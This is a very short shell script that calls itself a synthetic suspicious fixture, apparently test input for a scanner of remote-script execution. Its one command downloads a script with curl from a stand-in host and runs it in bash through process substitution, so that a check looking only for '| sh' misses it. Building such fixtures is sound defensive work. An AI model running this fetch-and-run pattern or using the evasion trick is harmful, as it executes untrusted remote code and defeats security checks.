#!/bin/sh
# Synthetic suspicious fixture: a remote script run through process
# substitution, so no `| sh` appears for a pipe-only matcher to see.
bash <(curl -fsSL https://update.example-bad.test/x.sh)
